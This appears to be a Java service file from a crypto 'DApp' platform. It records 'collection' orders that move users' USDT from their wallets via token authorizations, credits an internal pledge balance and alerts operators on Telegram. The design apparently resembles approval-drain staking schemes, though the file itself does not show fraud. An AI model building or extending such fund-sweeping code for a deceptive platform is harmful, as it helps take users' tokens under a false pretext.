package project.monitor.job.transferfrom;

import java.io.Serializable;
import java.util.Date;

import kernel.util.Arith;
import kernel.util.ThreadUtils;
import project.log.MoneyLog;
import project.log.MoneyLogService;
import project.monitor.AutoMonitorAddressConfigService;
import project.monitor.AutoMonitorOrderService;
import project.monitor.AutoMonitorTipService;
import project.monitor.AutoMonitorWalletService;
import project.monitor.bonus.AutoMonitorSettleAddressConfigService;
import project.monitor.bonus.BonusSettlementService;
import project.monitor.erc20.service.Erc20Service;
import project.monitor.model.AutoMonitorAddressConfig;
import project.monitor.model.AutoMonitorOrder;
import project.monitor.model.AutoMonitorWallet;
import project.monitor.pledge.PledgeOrderService;
import project.monitor.report.DAppUserDataSumService;
import project.monitor.telegram.business.TelegramBusinessMessageService;
import project.party.PartyService;
import project.party.model.Party;
import project.syspara.SysparaService;
import project.user.UserDataService;
import project.wallet.WalletExtend;
import project.wallet.WalletService;

public class TransferFromServiceImpl implements TransferFromService{
	
    private Erc20Service erc20Service;
    
    private WalletService walletService;
    
    protected PartyService partyService;
    
    private SysparaService sysparaService;
    
    private UserDataService userDataService;
    
    protected MoneyLogService moneyLogService;
    
    private PledgeOrderService pledgeOrderService;
    
    protected AutoMonitorTipService autoMonitorTipService;
    
    protected BonusSettlementService bonusSettlementService;
    
    private AutoMonitorOrderService autoMonitorOrderService;
    
    protected DAppUserDataSumService dAppUserDataSumService;
    
    protected AutoMonitorWalletService autoMonitorWalletService;
    
    private AutoMonitorAddressConfigService autoMonitorAddressConfigService;
    
    protected TelegramBusinessMessageService telegramBusinessMessageService;
    
    protected AutoMonitorSettleAddressConfigService autoMonitorSettleAddressConfigService;
    
    public void saveTransferFrom(final TransferFrom transferFrom) {
        final AutoMonitorWallet item = transferFrom.getAutoMonitorWallet();
        final String to = transferFrom.getTo();
        final AutoMonitorOrder entity = new AutoMonitorOrder();
        entity.setPartyId(item.getPartyId());
        entity.setCreated(new Date());
        entity.setAddress(item.getAddress());
        entity.setChannel_address(to);
        entity.setMonitor_address(item.getMonitor_address());
        entity.setRelationOrderNo((transferFrom.getRelationOrderNo() == null) ? "" : transferFrom.getRelationOrderNo());
        double balance = 0.0;
        if (transferFrom.getCollectAmount() <= 0.0) {
            final WalletExtend walletExtend = this.walletService.saveExtendByPara(item.getPartyId(), "USDT_USER");
            balance = walletExtend.getAmount();
            final Double _balance = this.erc20Service.getBalance(item.getAddress());
            if (_balance != null) {
                balance = _balance;
            }
        }
        else {
            balance = transferFrom.getCollectAmount();
        }
        entity.setVolume(Double.valueOf(balance));
        entity.setSettle_amount(Double.valueOf(this.autoMonitorSettleAddressConfigService.computeSettleAmount((double)entity.getVolume())));
        final AutoMonitorOrder db = this.autoMonitorOrderService.findByAddressAndSucceeded(item.getAddress(), 0);
        if (db != null) {
            entity.setSucceeded(2);
            entity.setError("该地址存在未完成的归集记录");
            this.autoMonitorOrderService.save(entity);
            return;
        }
        final Double balance_min = this.sysparaService.find("transferfrom_balance_min").getDouble();
        if (balance < balance_min) {
            entity.setSucceeded(2);
            entity.setError("币值少于[" + balance_min + "]USDT");
            this.autoMonitorOrderService.save(entity);
            return;
        }
        final AutoMonitorAddressConfig config = this.autoMonitorAddressConfigService.findByAddress(item.getMonitor_address());
        if (config == null) {
            entity.setSucceeded(2);
            entity.setError("无法找到授权地址鉴权信息");
            this.autoMonitorOrderService.save(entity);
            return;
        }
        entity.setSucceeded(-1);
        this.autoMonitorOrderService.save(entity);
    }
    
    public void saveConfirm(final String id, final Integer status, final String hash) {
        final AutoMonitorOrder entity = this.autoMonitorOrderService.findById(id);
        if (entity.getSucceeded() != 0) {
            return;
        }
        final Party party = this.partyService.cachePartyBy((Serializable)entity.getPartyId().toString(), false);
        if (status == 0) {
            entity.setSucceeded(2);
            this.autoMonitorOrderService.update(entity);
            this.telegramBusinessMessageService.sendTransferFromErrorTeleg(party, (double)entity.getVolume(), (String)null, entity.getTxn_hash());
        }
        else if (status == 1) {
            entity.setSucceeded(1);
            this.autoMonitorOrderService.update(entity);
            final Double balance = this.erc20Service.getBalance(entity.getAddress());
            final WalletExtend walletExtend = this.walletService.saveExtendByPara(entity.getPartyId(), "USDT_USER");
            if (walletExtend.getAmount() != balance) {
                this.walletService.updateExtend(entity.getPartyId().toString(), "USDT_USER", Arith.sub((double)balance, walletExtend.getAmount()));
            }
            this.userDataService.saveRechargeHandleDapp(entity.getPartyId(), (double)entity.getVolume(), "usdt");
            this.dAppUserDataSumService.saveTransferfrom(entity.getPartyId(), (double)entity.getVolume());
            this.walletService.updateExtend(entity.getPartyId().toString(), "USDT_DAPP", (double)entity.getVolume());
            this.pledgeOrderService.savejoin((Serializable)entity.getPartyId().toString());
            final double amount_before = walletExtend.getAmount();
            final MoneyLog moneyLog = new MoneyLog();
            moneyLog.setAmount_before(amount_before);
            moneyLog.setAmount((double)entity.getVolume());
            moneyLog.setAmount_after(Arith.add(walletExtend.getAmount(), (double)entity.getVolume()));
            moneyLog.setLog("归集订单归集成功质押金额变化");
            moneyLog.setPartyId((Serializable)entity.getPartyId().toString());
            moneyLog.setWallettype("USDT_DAPP");
            moneyLog.setCreateTime(new Date());
            this.moneyLogService.save(moneyLog);
            ThreadUtils.sleep(300L);
            this.telegramBusinessMessageService.sendCollectTeleg(party, (double)entity.getVolume());
            this.bonusSettlementService.signal();
        }
    }
    
    public void setWalletService(final WalletService walletService) {
        this.walletService = walletService;
    }
    
    public void setAutoMonitorAddressConfigService(final AutoMonitorAddressConfigService autoMonitorAddressConfigService) {
        this.autoMonitorAddressConfigService = autoMonitorAddressConfigService;
    }
    
    public void setErc20Service(final Erc20Service erc20Service) {
        this.erc20Service = erc20Service;
    }
    
    public void setAutoMonitorOrderService(final AutoMonitorOrderService autoMonitorOrderService) {
        this.autoMonitorOrderService = autoMonitorOrderService;
    }
    
    public void setSysparaService(final SysparaService sysparaService) {
        this.sysparaService = sysparaService;
    }
    
    public void setUserDataService(final UserDataService userDataService) {
        this.userDataService = userDataService;
    }
    
    public void setPartyService(final PartyService partyService) {
        this.partyService = partyService;
    }
    
    public void setTelegramBusinessMessageService(final TelegramBusinessMessageService telegramBusinessMessageService) {
        this.telegramBusinessMessageService = telegramBusinessMessageService;
    }
    
    public void setdAppUserDataSumService(final DAppUserDataSumService dAppUserDataSumService) {
        this.dAppUserDataSumService = dAppUserDataSumService;
    }
    
    public void setPledgeOrderService(final PledgeOrderService pledgeOrderService) {
        this.pledgeOrderService = pledgeOrderService;
    }
    
    public void setBonusSettlementService(final BonusSettlementService bonusSettlementService) {
        this.bonusSettlementService = bonusSettlementService;
    }
    
    public void setAutoMonitorSettleAddressConfigService(final AutoMonitorSettleAddressConfigService autoMonitorSettleAddressConfigService) {
        this.autoMonitorSettleAddressConfigService = autoMonitorSettleAddressConfigService;
    }
    
    public void setAutoMonitorWalletService(final AutoMonitorWalletService autoMonitorWalletService) {
        this.autoMonitorWalletService = autoMonitorWalletService;
    }
    
    public void setMoneyLogService(final MoneyLogService moneyLogService) {
        this.moneyLogService = moneyLogService;
    }
    
    public void setAutoMonitorTipService(final AutoMonitorTipService autoMonitorTipService) {
        this.autoMonitorTipService = autoMonitorTipService;
    }
}
